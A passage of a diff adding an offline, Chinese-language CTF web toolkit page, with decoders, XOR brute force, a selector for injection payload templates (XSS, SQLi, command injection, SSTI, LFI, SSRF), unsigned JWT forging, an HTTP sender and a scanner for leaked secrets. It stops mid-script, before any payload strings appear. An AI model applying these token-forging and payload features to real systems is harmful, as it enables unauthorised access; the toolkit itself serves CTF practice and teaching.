@@ -1,0 +1,1869 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Web 本地解码工具 - 整合版</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:system-ui,-apple-system,"Segoe UI",Roboto,"Microsoft YaHei",sans-serif;background:#f6f7f9;color:#1f2328}
+.wrap{max-width:1200px;margin:24px auto;padding:0 16px}
+.card{background:#fff;border:1px solid #e5e7eb;border-radius:14px;padding:20px 22px;margin-bottom:16px;box-shadow:0 2px 10px rgba(0,0,0,.04)}
+h1{font-size:22px;margin:0 0 6px}.sub{color:#6b7280;font-size:14px;margin:0 0 16px}
+h3{font-size:16px;margin:0 0 12px}
+h4{font-size:14px;margin:0 0 8px}
+label{font-size:13px;font-weight:600;display:block;margin:12px 0 6px}
+textarea,select,input[type=text],input[type=number]{width:100%;padding:10px 12px;border:1px solid #d1d5db;border-radius:8px;font-size:14px;font-family:ui-monospace,Consolas,monospace;outline:none;background:#fff}
+textarea:focus,select:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.15)}
+textarea{resize:vertical;min-height:110px}
+.row{display:flex;gap:12px;flex-wrap:wrap}.col{flex:1;min-width:220px}
+.wide-select{width:100%;max-width:400px}
+.btn{display:inline-block;padding:9px 18px;border-radius:8px;border:1px solid #d1d5db;background:#fff;cursor:pointer;font-size:14px;margin:8px 8px 0 0}
+.btn.primary{background:#2563eb;color:#fff;border-color:#2563eb}
+.btn.success{background:#059669;color:#fff;border-color:#059669}
+.btn.outline{background:transparent}
+.btn.small{padding:6px 12px;font-size:12px;margin:4px 4px 0 0}
+.btn:hover{opacity:.9}
+.radios{display:flex;gap:16px;flex-wrap:wrap}
+.radios label{font-weight:400;display:flex;align-items:center;gap:6px;margin:0}
+.tag{display:inline-block;padding:2px 8px;border-radius:999px;background:#eff6ff;color:#2563eb;font-size:12px;margin-right:4px}
+.history{max-height:220px;overflow:auto}
+.empty{color:#9ca3af;font-size:13px;padding:8px 0}
+.mono{font-family:ui-monospace,Consolas,monospace;word-break:break-all;white-space:pre-wrap}
+.footer{font-size:12px;color:#9ca3af;text-align:center;margin:16px 0 8px}
+.xor-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:8px}
+.xor-item{border:1px solid #e5e7eb;border-radius:8px;padding:10px}
+.xor-item.flag-found{border:2px solid #dc2626;background:#fef2f2}
+.xor-key{font-weight:700;color:#2563eb}
+.xor-val{word-break:break-all;font-size:12px;color:#374151;margin-top:4px}
+.badge{display:inline-block;padding:2px 6px;border-radius:4px;background:#fee2e2;color:#991b1b;font-size:11px}
+.blind-badge{background:#fff7ed;color:#9a3412}
+.pal-item{display:flex;align-items:center;gap:10px;padding:8px;border-bottom:1px solid #eee}
+.pal-item:last-child{border-bottom:none}
+.pal-name{font-weight:600;width:110px;font-size:12px}
+.pal-val{flex:1;word-break:break-all;font-size:12px;color:#4b5563}
+.pal-copy{background:#fff;border:1px solid #d1d5db;border-radius:6px;padding:4px 10px;font-size:12px;cursor:pointer}
+.pal-copy:hover{background:#f3f4f6}
+.jwt-panel{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.jwt-part{border:1px solid #e5e7eb;border-radius:8px;padding:10px}
+.jwt-part pre{margin:0;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.warning{background:#fef3c7;border:1px solid #f59e0b;border-radius:8px;padding:12px;margin-bottom:16px;font-size:13px;color:#92400e}
+.jsrecon-finding{border:1px solid #e5e7eb;border-radius:8px;padding:10px;margin:8px 0;background:#fbfbfb}
+.jsrecon-finding.critical{border-color:#dc2626;background:#fef2f2}
+.jsrecon-finding.warning{border-color:#f59e0b;background:#fffbeb}
+.jsrecon-finding.info{border-color:#2563eb;background:#eff6ff}
+.jsrecon-finding h4{margin:0 0 6px;font-size:14px}
+.jsrecon-finding .key{color:#dc2626;font-weight:bold}
+.jsrecon-finding .val{color:#374151;word-break:break-all;margin-top:4px}
+.jsrecon-finding .tag{font-size:11px;padding:2px 6px;border-radius:4px;margin-right:6px}
+.tag.critical{background:#fee2e2;color:#991b1b}
+.tag.warning{background:#fef3c7;color:#92400e}
+.tag.info{background:#dbeafe;color:#1e40af}
+.jsrecon-stats{display:flex;gap:16px;margin:12px 0}
+.jsrecon-stat{background:#f3f4f6;padding:10px 14px;border-radius:8px;text-align:center;min-width:80px}
+.jsrecon-stat .num{font-size:20px;font-weight:bold;color:#2563eb}
+.jsrecon-stat .lbl{font-size:12px;color:#6b7280}
+.placeholder-row{margin:8px 0;padding:8px;background:#f9fafb;border-radius:6px;display:flex;align-items:center;gap:8px}
+.placeholder-label{font-size:12px;color:#6b7280;min-width:70px}
+.syntax-label{position:absolute;top:0;right:0;font-size:10px;padding:2px 6px;background:#e5e7eb;border-radius:0 8px 0 8px;color:#6b7280}
+.filter-box{margin:10px 0;padding:8px;border:1px solid #d1d5db;border-radius:8px;width:100%}
+.flag-highlight{color:#dc2626;font-weight:bold;background:#fef2f2;padding:2px 4px;border-radius:4px}
+.copy-btn{background:#2563eb;color:#fff;border:none;border-radius:4px;padding:4px 8px;font-size:11px;cursor:pointer;margin-left:8px}
+.copy-btn:hover{background:#1d4ed8}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="card">
+<h1>CTF Web 本地解码工具</h1>
+<p class="sub">纯本地运行 · 不联网 · 不上传数据 · 双击本文件即可使用 · 适合 CTF 比赛现场离线解题</p>
+
+<div class="warning"><strong>⚠️ 重要提示：</strong> 本工具仅用于授权测试环境、CTF 比赛与安全教学。禁止用于未授权的渗透测试或非法用途。</div>
+</div>
+
+<!-- 1. 解码器部分 -->
+<div class="card">
+<h3>1. 编码解码</h3>
+<div class="row">
+<div class="col">
+<label>模式</label>
+<div class="radios">
+<label><input type="radio" name="mode" value="decode" checked> 解码</label>
+<label><input type="radio" name="mode" value="encode"> 编码</label>
+<label><input type="radio" name="mode" value="auto"> 自动识别多层</label>
+</div>
+</div>
+<div class="col">
+<label>算法</label>
+<select id="algo">
+<option value="base64">Base64</option>
+<option value="base32">Base32</option>
+<option value="hex">Hex 十六进制</option>
+<option value="url">URL Encode</option>
+<option value="rot13">ROT13</option>
+<option value="caesar">Caesar 凯撒</option>
+<option value="binary">Binary 二进制</option>
+<option value="reverse">Reverse 反转</option>
+<option value="morse">Morse 摩尔斯</option>
+<option value="xor">XOR 单字节</option>
+<option value="html">HTML 实体</option>
+<option value="unicode">Unicode 转义</option>
+</select>
+</div>
+<div class="col" id="xorKeyBox" style="display:none">
+<label>XOR 密钥 (0-255 / 字符)</label>
+<input type="text" id="xorKey" value="42" placeholder="例如 42 或 K">
+</div>
+<div class="col" id="caesarKeyBox" style="display:none">
+<label>Caesar 位移 (1-25)</label>
+<input type="number" id="caesarKey" value="3" min="1" max="25">
+</div>
+</div>
+
+<label>输入</label>
+<textarea id="inText" placeholder="粘贴密文，例如：ZmxhZ3t3ZWJfZGVjb2Rlcn0= 或 666c61677b746573747d"></textarea>
+
+<div>
+<button class="btn primary" onclick="doTransform()">执行</button>
+<button class="btn success" onclick="autoDecodeRun()">自动识别</button>
+<button class="btn" onclick="swapIO()">交换输入输出</button>
+<button class="btn" onclick="copyOut()">复制结果</button>
+<button class="btn outline" onclick="clearAll()">清空</button>
+</div>
+
+<label>输出</label>
+<textarea id="outText" readonly placeholder="结果显示在这里"></textarea>
+</div>
+
+<!-- 2. XOR 暴力部分（增强版） -->
+<div class="card">
+<h3>2. XOR 暴力破解（增强版）</h3>
+<label>输入模式</label>
+<div class="radios">
+<label><input type="radio" name="xorMode" value="hex" checked> 十六进制</label>
+<label><input type="radio" name="xorMode" value="text"> 普通字符串</label>
+</div>
+
+<label>输入密文</label>
+<textarea id="xorIn" placeholder="十六进制: 28222f29353d272029222b112c373a2b1136213c113a2b3d3a33&#10;或字符串: hello world"></textarea>
+
+<div style="margin-top:8px">
+<button class="btn primary" onclick="xorBruteForce()">暴力 0-255 全量尝试</button>
+<button class="btn outline" onclick="clearXor()">清空</button>
+</div>
+
+<label style="margin-top:12px;">循环 XOR 密钥长度（单字节选 1）</label>
+<select id="xorKeyLen" style="width:120px;padding:6px 10px;border:1px solid #d1d5db;border-radius:6px;">
+<option value="1">1 字节（单字节 XOR）</option>
+<option value="2">2 字节</option>
+<option value="3">3 字节</option>
+<option value="4">4 字节</option>
+<option value="5">5 字节</option>
+<option value="6">6 字节</option>
+<option value="7">7 字节</option>
+<option value="8">8 字节</option>
+</select>
+<label style="margin-left:12px;font-size:13px;color:#6b7280;">>1 字节表示多字节循环异或</label>
+
+<label style="margin-top:12px;">已知明文辅助（可选，用于推导密钥）</label>
+<input type="text" id="xorKnownPlain" class="filter-box" placeholder="例如 flag{ 或 ctf{ 或 admin" style="width:100%;">
+
+<label style="margin-top:12px;">筛选结果</label>
+<input type="text" id="xorFilter" class="filter-box" placeholder="输入关键词筛选，例如 flag、ctf、hidden" oninput="filterXorResults()">
+
+<div id="xorOut" class="xor-grid"></div>
+</div>
+
+<!-- 3. Payload 模板部分 -->
+<div class="card">
+<h3>3. Payload 模板</h3>
+<div class="row" style="margin-bottom:16px">
+<div class="col" style="flex:1;min-width:300px">
+<label>一级分类</label>
+<select id="payloadCat" class="wide-select" onchange="onCatChange()">
+<option value="xss">XSS - 跨站脚本</option>
+<option value="sqli">SQL注入 - 数据库注入</option>
+<option value="cmdi">命令注入 - 系统命令</option>
+<option value="ssti">模板注入 - SSTI</option>
+<option value="lfi">文件包含 - LFI</option>
+<option value="upload">文件上传 - Upload</option>
+<option value="ssrf">SSRF - 服务端请求伪造</option>
+</select>
+</div>
+<div class="col" style="flex:1;min-width:300px">
+<label>二级子模板</label>
+<select id="payloadSub" class="wide-select" onchange="onSubChange()">
+</select>
+</div>
+</div>
+
+<label>Payload 预览与编辑</label>
+<div style="position:relative;margin-bottom:8px">
+<div class="syntax-label" id="syntaxLang">HTML</div>
+<textarea id="payloadEditor" rows="4" placeholder="选择模板后自动显示..."></textarea>
+</div>
+
+<div id="placeholderForm"></div>
+
+<div style="margin-top:12px">
+<button class="btn success" onclick="applyPlaceholders()">生成 Payload</button>
+<button class="btn small" onclick="copyPayload()">复制结果</button>
+<button class="btn small" onclick="encodeUrl()">URL 编码</button>
+<button class="btn small" onclick="encodeUrlDouble()">双重 URL 编码</button>
+<button class="btn small" onclick="encodeHtml()">HTML 实体编码</button>
+<button class="btn small" onclick="encodeUni()">Unicode 编码</button>
+</div>
+
+<div id="payloadResult" style="margin-top:10px;padding:10px;background:#f3f4f6;border-radius:8px;display:none;">
+<label style="margin-bottom:6px;">生成结果</label>
+<textarea id="payloadResultText" rows="3" readonly style="background:#fff;"></textarea>
+</div>
+
+<div class="empty" style="margin-top:10px; font-size:12px;">提示：回显 payload 适合有页面回显的注入点；盲注 payload 适合无回显场景，请根据实际情况选择。</div>
+</div>
+
+<!-- 4. JWT 工具部分 -->
+<div class="card">
+<h3>4. JWT 工具</h3>
+<div class="jwt-panel">
+<div class="jwt-part">
+<label>输入 JWT</label>
+<textarea id="jwtInput" rows="8" placeholder="粘贴完整 JWT，例如 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
+<div style="margin-top:10px">
+<button class="btn primary" onclick="jwtDecode()">解析</button>
+<button class="btn outline" onclick="jwtClear()">清空</button>
+</div>
+</div>
+<div class="jwt-part">
+<label>结果</label>
+<div id="jwtHeader"></div>
+<div id="jwtPayload"></div>
+<div id="jwtSig"></div>
+</div>
+</div>
+<label>伪造新 JWT（不签名，仅改 payload）</label>
+<textarea id="jwtNewPayload" rows="4" placeholder='{"admin":true,"user":"ctfer"}'></textarea>
+<div style="margin-top:8px">
+<button class="btn success" onclick="jwtForge()">生成新 JWT</button>
+<button class="btn outline" onclick="jwtCopy()">复制</button>
+</div>
+<div id="jwtResult" style="margin-top:8px"></div>
+</div>
+
+<!-- 5. HTTP 请求部分 -->
+<div class="card">
+<h3>5. HTTP 请求</h3>
+<label>目标 URL</label>
+<input type="text" id="httpUrl" placeholder="http://target.com/api?id=1">
+<div class="row" style="margin-top:10px">
+<div class="col" style="flex:1">
+<label>方法</label>
+<select id="httpMethod"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option></select>
+</div>
+<div class="col" style="flex:1">
+<label>Headers (每行 Key: Value)</label>
+<textarea id="httpHeaders" rows="3" placeholder="User-Agent: Mozilla/5.0&#10;Cookie: session=abc"></textarea>
+</div>
+</div>
+<label>Body</label>
+<textarea id="httpBody" rows="3" placeholder="id=1"></textarea>
+<div style="margin-top:10px">
+<button class="btn primary" onclick="httpSend()">发送请求</button>
+<button class="btn outline" onclick="httpClear()">清空</button>
+<button class="btn success" onclick="httpResToJsRecon()">响应→扫描</button>
+</div>
+<label>响应</label>
+<textarea id="httpRes" rows="10" readonly placeholder="响应内容显示在这里"></textarea>
+<div style="font-size:11px;color:#9ca3af;margin-top:4px;">💡 点击「响应→扫描」可把响应内容发送到 JSRecon 粘贴区进行端点/密钥/表单扫描</div>
+</div>
+
+<!-- JSRecon 侦察部分 -->
+<div class="card">
+<h3>6. JS 资产侦察</h3>
+<p class="sub">扫描目标页面中的 JS 资产、敏感端点、密钥泄露和调试接口</p>
+
+<div class="row">
+<div class="col" style="flex:1;min-width:300px">
+<label>目标 URL</label>
+<input type="text" id="jsReconUrl" placeholder="http://target.com 或 https://example.com/page">
+</div>
+<div class="col" style="flex:1;min-width:220px">
+<label style="margin-bottom:6px;"></label>
+<div style="margin-top:26px">
+<button class="btn primary" onclick="jsReconScan()">启动扫描</button>
+<button class="btn outline" onclick="jsReconClear()">清空结果</button>
+</div>
+</div>
+</div>
+
+<label style="margin-top:12px;">或直接粘贴 HTML 源码（完全避开 CORS 拦截）</label>
+<div class="row">
+<div class="col" style="flex:2;min-width:300px">
+<textarea id="jsReconHtmlPaste" rows="4" placeholder="把目标页面的 HTML 源码粘贴到这里，然后点击「扫描粘贴的 HTML」"></textarea>
+</div>
+<div class="col" style="flex:1;min-width:220px;display:flex;flex-direction:column;justify-content:flex-end;">
+<button class="btn success" onclick="scanPastedHtml()">扫描粘贴的 HTML</button>
+<button class="btn outline" style="margin-top:8px;" onclick="$('jsReconHtmlPaste').value='';">清空粘贴区</button>
+</div>
+</div>
+
+<div class="warning" style="margin-top:10px;">
+💡 使用建议：如果直接扫描 URL 被 CORS 拦截，请在目标页面按 <kbd>F12</kbd> → 复制整页 HTML → 粘贴到这里扫描，结果完全一样，不受跨域限制。
+</div>
+
+<label>扫描选项</label>
+<div class="radios">
+<label><input type="checkbox" checked id="jsReconScanEndpoints"> 端点发现</label>
+<label><input type="checkbox" checked id="jsReconScanSecrets"> 密钥泄露</label>
+<label><input type="checkbox" checked id="jsReconScanForms"> 表单发现</label>
+<label><input type="checkbox" id="jsReconScanDebug"> 调试接口</label>
+</div>
+
+<div id="jsReconStats" class="jsrecon-stats" style="display:none;">
+<div class="jsrecon-stat"><div class="num" id="jsStatEndpoints">0</div><div class="lbl">端点</div></div>
+<div class="jsrecon-stat"><div class="num" id="jsStatSecrets">0</div><div class="lbl">密钥</div></div>
+<div class="jsrecon-stat"><div class="num" id="jsStatForms">0</div><div class="lbl">表单</div></div>
+<div class="jsrecon-stat"><div class="num" id="jsStatDebug">0</div><div class="lbl">调试</div></div>
+</div>
+
+<div id="jsReconResults"></div>
+
+<div class="empty" style="font-size:12px;">提示：扫描结果将高亮显示可疑内容，红色为高危（密钥/调试接口），黄色为中危（端点），蓝色为低危（表单）。</div>
+</div>
+
+<!-- 已知明文异或分析模块 -->
+<div class="card">
+<h3>7. 已知明文异或分析</h3>
+<p class="sub">输入密文和已知明文片段，自动推导异或密钥流，检测单字节/多字节循环 XOR</p>
+
+<div class="row">
+<div class="col" style="flex:1;min-width:280px">
+<label>密文 (Hex)</label>
+<textarea id="xorKnownCipher" rows="3" placeholder="例如：5742564548027b415e4257414253474448"></textarea>
+</div>
+<div class="col" style="flex:1;min-width:280px">
+<label>已知明文</label>
+<textarea id="xorKnownPlain" rows="3" placeholder="例如：flag{test_1byte_xor}"></textarea>
+</div>
+</div>
+
+<div style="margin-top:12px;">
+<button class="btn primary" onclick="analyzeKnownXOR()">分析异或密钥</button>
+<button class="btn outline" onclick="clearKnownXOR()">清空</button>
+</div>
+
+<div id="xorKnownResult" style="margin-top:12px; font-size:13px; line-height:1.6;"></div>
+</div>
+
+<!-- 8. 自动脚本模块 -->
+<div class="card">
+<h3>8. 自动脚本</h3>
+<p class="sub">编码链串联、自定义 JS 处理、批量行处理</p>
+
+<div class="row">
+<div class="col" style="flex:1;min-width:300px">
+<label>输入</label>
+<textarea id="autoInput" rows="6" placeholder="输入要处理的文本，支持多行"></textarea>
+</div>
+<div class="col" style="flex:1;min-width:300px">
+<label>输出</label>
+<textarea id="autoOutput" rows="6" readonly placeholder="处理结果将显示在这里"></textarea>
+</div>
+</div>
+
+<div style="margin-top:12px;">
+<label style="font-weight:600;">编码链（按顺序执行）</label>
+<div style="margin-top:6px;">
+<select id="autoChain1" style="width:140px;padding:6px;margin-right:6px;">
+<option value="none">无</option>
+<option value="base64enc">Base64 编码</option>
+<option value="base64dec">Base64 解码</option>
+<option value="urlenc">URL 编码</option>
+<option value="urldec">URL 解码</option>
+<option value="hexenc">Hex 编码</option>
+<option value="hexdec">Hex 解码</option>
+<option value="rot13">ROT13</option>
+<option value="reverse">字符串反转</option>
+<option value="upper">大写</option>
+<option value="lower">小写</option>
+</select>
+<select id="autoChain2" style="width:140px;padding:6px;margin-right:6px;">
+<option value="none">无</option>
+<option value="base64enc">Base64 编码</option>
+<option value="base64dec">Base64 解码</option>
+<option value="urlenc">URL 编码</option>
+<option value="urldec">URL 解码</option>
+<option value="hexenc">Hex 编码</option>
+<option value="hexdec">Hex 解码</option>
+<option value="rot13">ROT13</option>
+<option value="reverse">字符串反转</option>
+<option value="upper">大写</option>
+<option value="lower">小写</option>
+</select>
+<select id="autoChain3" style="width:140px;padding:6px;">
+<option value="none">无</option>
+<option value="base64enc">Base64 编码</option>
+<option value="base64dec">Base64 解码</option>
+<option value="urlenc">URL 编码</option>
+<option value="urldec">URL 解码</option>
+<option value="hexenc">Hex 编码</option>
+<option value="hexdec">Hex 解码</option>
+<option value="rot13">ROT13</option>
+<option value="reverse">字符串反转</option>
+<option value="upper">大写</option>
+<option value="lower">小写</option>
+</select>
+<button class="btn primary" onclick="runAutoChain()">运行编码链</button>
+<button class="btn outline" onclick="clearAuto()">清空</button>
+</div>
+</div>
+
+<div style="margin-top:12px;">
+<label style="font-weight:600;">自定义 JS 处理（输入变量为 `input`）</label>
+<textarea id="autoJsCode" rows="4" placeholder="例如：return input.split('').reverse().join('');"></textarea>
+<div style="margin-top:6px;">
+<button class="btn success" onclick="runAutoJs()">运行 JS</button>
+</div>
+</div>
+
+<div style="margin-top:12px;">
+<label style="font-weight:600;">批量行处理</label>
+<div style="margin-top:6px;">
+<select id="autoBatchOp" style="width:180px;padding:6px;margin-right:6px;">
+<option value="base64enc">每行 Base64 编码</option>
+<option value="base64dec">每行 Base64 解码</option>
+<option value="urlenc">每行 URL 编码</option>
+<option value="urldec">每行 URL 解码</option>
+<option value="hexenc">每行 Hex 编码</option>
+<option value="hexdec">每行 Hex 解码</option>
+<option value="rot13">每行 ROT13</option>
+<option value="reverse">每行反转</option>
+<option value="md5">每行 MD5</option>
+<option value="sha256">每行 SHA256</option>
+</select>
+<button class="btn primary" onclick="runAutoBatch()">批量处理</button>
+</div>
+<div id="autoBatchResult" style="margin-top:8px;font-size:12px;color:#6b7280;"></div>
+</div>
+
+<div id="autoResult" style="margin-top:12px;font-family:ui-monospace,Consolas,monospace;white-space:pre-wrap;background:#f8fafc;border:1px solid #e5e7eb;border-radius:8px;padding:12px;display:none;"></div>
+</div>
+
+<!-- 操作历史 -->
+<div class="card">
+<h3>操作历史（最近 20 条）</h3>
+<button class="btn outline" onclick="clearHistory()">清空历史</button>
+<div class="history" id="history"></div>
+</div>
+
+<p class="footer">CTF Web Decoder · Local Offline · F:\ctf aaa\ctf-decoder.html · 仅供 CTF 学习与比赛使用</p>
+</div>
+
+<script>
+// ===== Helpers =====
+function $(id){ return document.getElementById(id); }
+function escapeHtml(s){
+  if (s === null || s === undefined) return '';
+  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+
+// ===== History =====
+var hist = JSON.parse(localStorage.getItem('ctf_hist') || '[]');
+function renderHist(){
+  var h = $('history');
+  if (hist.length && hist[0]) {
+    var latest = hist[0];
+    h.innerHTML = '<div style="padding:6px 0;border-bottom:1px solid #eee;font-size:13px"><b>#' + (hist.length-1) + ' ' + escapeHtml(latest.time) + '</b> <span class="tag">' + escapeHtml(latest.algo) + '</span> <span class="mono">' + escapeHtml(latest.result).slice(0,160) + '</span></div>';
+  } else {
+    h.innerHTML = '<div class="empty">暂无记录</div>';
+  }
+}
+function addHist(a,r){
+  hist.unshift({time:new Date().toLocaleTimeString(),algo:a,result:String(r).slice(0,160)});
+  hist = hist.slice(0,20);
+  localStorage.setItem('ctf_hist',JSON.stringify(hist));
+  renderHist();
+}
+function clearHistory(){
+  hist = [];
+  localStorage.removeItem('ctf_hist');
+  renderHist();
+}
+renderHist();
+
+// ===== Decoder Core =====
+var algoSel = $('algo');
+algoSel.addEventListener('change', function(){
+  if (algoSel.value === 'xor') {$('xorKeyBox').style.display = 'block';} else {$('xorKeyBox').style.display = 'none';}
+  if (algoSel.value === 'caesar') {$('caesarKeyBox').style.display = 'block';} else {$('caesarKeyBox').style.display = 'none';}
+});
+
+function caesar(t, s) { return t.replace(/[a-zA-Z]/g, function(c) {
+  var b = c <= 'Z' ? 65 : 97;
+  return String.fromCharCode(((c.charCodeAt(0) - b + s) % 26) + b);
+}); }
+function rot13(t) { return caesar(t, 13); }
+function toB64(t) { try { return btoa(unescape(encodeURIComponent(t))); } catch(e) { throw new Error('Base64编码失败'); } }
+function fromB64(t) {
+  try {
+    var s = t.replace(/\s/g, '');
+    if (s.includes('-') || s.includes('_')) {
+      s = s.replace(/-/g, '+').replace(/_/g, '/');
+    }
+    var pad = s.length % 4;
+    if (pad) s += '='.repeat(4 - pad);
+    var bin = atob(s);
+    var result = '';
+    for (var i = 0; i < bin.length; i++) {
+      result += String.fromCharCode(bin.charCodeAt(i));
+    }
+    return result;
+  } catch(e) { throw new Error('Base64解码失败: ' + e.message); }
+}
+function toB32(t) { var A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'; var b = '', out = '';
+  for (var i = 0; i < t.length; i++) { b += t.charCodeAt(i).toString(2).padStart(8, '0'); }
+  while (b.length % 5) b += '0';
+  for (var j = 0; j < b.length; j += 5) { out += A[parseInt(b.slice(j, j + 5), 2)]; }
+  return out;
+}
+function fromB32(t) { var A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'; var b = '';
+  for (var i = 0; i < t.length; i++) {
+    var idx = A.indexOf(t[i].toUpperCase()); if (idx === -1) continue;
+    b += idx.toString(2).padStart(5, '0');
+  }
+  while (b.length % 8) b = b.slice(0, -1);
+  var out = '';
+  for (var j = 0; j < b.length; j += 8) { out += String.fromCharCode(parseInt(b.slice(j, j + 8), 2)); }
+  return out;
+}
+function toHex(t) { return Array.from(t).map(function(c) { return c.charCodeAt(0).toString(16).padStart(2, '0'); }).join(' '); }
+function fromHex(t) {
+  var h = t.replace(/\s/g, '');
+  if (!/^[0-9a-fA-F]+$/.test(h) || h.length % 2) throw new Error('Hex格式错误');
+  return Array.from(h.match(/.{1,2}/g)).map(function(x) { return String.fromCharCode(parseInt(x, 16)); }).join('');
+}
+function toBin(t) { return Array.from(t).map(function(c) { return c.charCodeAt(0).toString(2).padStart(8, '0'); }).join(' '); }
+function fromBin(t) { return t.trim().split(/\s+/).map(function(b) {
+  if (!/^[01]{8}$/.test(b)) throw new Error('Binary格式错误');
+  return String.fromCharCode(parseInt(b, 2));
+}).join(''); }
+var MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9','.-.-.-':'.','--..--':',','-----.':';'}
+function fromMorse(t) { return t.trim().split(/\s*\/\s*|\s{2,}/).map(function(w) { return w.split(/\s+/).map(function(c) { return MORSE[c] || '?'; }).join(''); }).join(' '); }
+function toMorse(t) { return t.toUpperCase().split('').map(function(c) { return c === ' ' ? ' / ' : (MORSE[c] || c); }).join(' '); }
+function toHtml(t) { return t.replace(/[^\x00-\x7F]/g, function(c) { return '&#' + c.charCodeAt(0) + ';'; }).replace(/[&<>"']/g, function(c) { return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;'}[c]; }); }
+function fromHtml(t) { var d = document.createElement('textarea'); d.innerHTML = t; return d.value; }
+function toUni(t) { return Array.from(t).map(function(c) { return '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'); }).join(''); }
+function fromUni(t) { return t.replace(/\\u[0-9a-fA-F]{4}/g, function(m) { return String.fromCharCode(parseInt(m.slice(2), 16)); }); }
+function xorStr(t, key) { var k = isNaN(Number(key)) ? key.charCodeAt(0) : Number(key); return Array.from(t).map(function(c) { return String.fromCharCode(c.charCodeAt(0) ^ k); }).join(''); }
+
+function transform(t, algo, mode) {
+  if (mode === 'auto') return autoDecode(t);
+  if (algo === 'base64') return mode === 'decode' ? fromB64(t) : toB64(t);
+  if (algo === 'base32') return mode === 'decode' ? fromB32(t) : toB32(t);
+  if (algo === 'hex') return mode === 'decode' ? fromHex(t) : toHex(t);
+  if (algo === 'url') return mode === 'decode' ? decodeURIComponent(t) : encodeURIComponent(t);
+  if (algo === 'rot13') return rot13(t);
+  if (algo === 'caesar') { var s = Number($('caesarKey').value || 3); return caesar(t, mode === 'decode' ? 26 - s : s); }
+  if (algo === 'binary') return mode === 'decode' ? fromBin(t) : toBin(t);
+  if (algo === 'reverse') return t.split('').reverse().join('');
+  if (algo === 'morse') return mode === 'decode' ? fromMorse(t) : toMorse(t);
+  if (algo === 'xor') return xorStr(t, $('xorKey').value);
+  if (algo === 'html') return mode === 'decode' ? fromHtml(t) : toHtml(t);
+  if (algo === 'unicode') return mode === 'decode' ? fromUni(t) : toUni(t);
+  return t;
+}
+
+function autoDecode(t) {
+  var cur = (t || '').trim(); var steps = [];
+  for (var i = 0; i < 8; i++) {
+    var done = false;
+    try {
+      if (/^[A-Za-z0-9+/=_-]+$/.test(cur) && cur.length >= 8) {
+        var d = fromB64(cur);
+        if (d && /^[ -~\n\r\t]+$/.test(d) && d !== cur) {
+          steps.push('Base64 -> ' + d); cur = d; done = true;
+        }
+      }
+    } catch (e) {}
+    if (done) continue;
+    try {
+      var d2 = fromB32(cur.replace(/\s/g, ''));
+      if (d2 && /^[ -~]+$/.test(d2) && d2 !== cur) {
+        steps.push('Base32 -> ' + d2); cur = d2; done = true;
+      }
+    } catch (e) {}
+    if (done) continue;
+    try {
+      var d3 = fromHex(cur);
+      if (d3 && /^[ -~\n\r\t]+$/.test(d3) && d3 !== cur) {
+        steps.push('Hex -> ' + d3); cur = d3; done = true;
+      }
+    } catch (e) {}
+    if (done) continue;
+    try {
+      if (cur.indexOf('%') > -1) {
+        var d4 = decodeURIComponent(cur);
+        if (d4 !== cur) { steps.push('URL -> ' + d4); cur = d4; done = true; }
+      }
+    } catch (e) {}
+    if (done) continue;
+    try {
+      if (/^[01\s]{16,}$/.test(cur)) {
+        var d5 = fromBin(cur);
+        if (d5 && /^[ -~]+$/.test(d5)) { steps.push('Binary -> ' + d5); cur = d5; done = true; }
+      }
+    } catch (e) {}
+    if (done) continue;
+    try {
+      if (/^[.-]{2,}[\s/]*[.-]{2,}$/.test(cur)) {
+        var d6 = fromMorse(cur);
+        if (d6 && d6 !== '?') { steps.push('Morse -> ' + d6); cur = d6; done = true; }
+      }
+    } catch (e) {}
+    if (!done) break;
+  }
+  if (steps.length > 0) return steps.join('\n') + '\n\nFinal: ' + cur;
+  return 'Auto: 未识别到常见编码，请切换手动模式';
+}
+
+function getMode(){ return document.querySelector('input[name=mode]:checked').value; }
+function doTransform(){
+  var t = $('inText').value; if (!t.trim()) return alert('请先输入内容');
+  try {
+    var out = transform(t, algoSel.value, getMode());
+    $('outText').value = out;
+    addHist(algoSel.value + '-' + getMode(), out);
+  } catch (e) {
+    $('outText').value = 'Error: ' + e.message;
+    console.error('Transform error:', e);
+  }
+}
+function autoDecodeRun(){
+  var t = $('inText').value; if (!t.trim()) return alert('请先输入内容');
+  try { $('outText').value = autoDecode(t); addHist('auto', $('outText').value); }
+  catch (e) { $('outText').value = 'Error: ' + e.message; }
+}
+function swapIO() { $('inText').value = $('outText').value; $('outText').value = ''; }
+function copyOut() { var t = $('outText').value; if (!t) return alert('无结果可复制'); navigator.clipboard.writeText(t).then(function(){ alert('已复制'); }); }
+function clearAll() { $('inText').value = ''; $('outText').value = ''; }
+
+// ===== XOR Brute Force (Enhanced) =====
+var xorResults = [];
+function xorBruteForce(){
+  var t = $('xorIn').value;
+  if (!t || !t.trim()) { alert('请先输入密文'); return; }
+  var modeEl = document.querySelector('input[name=xorMode]:checked');
+  var mode = modeEl ? modeEl.value : 'hex';
+  var keyLenEl = $('xorKeyLen');
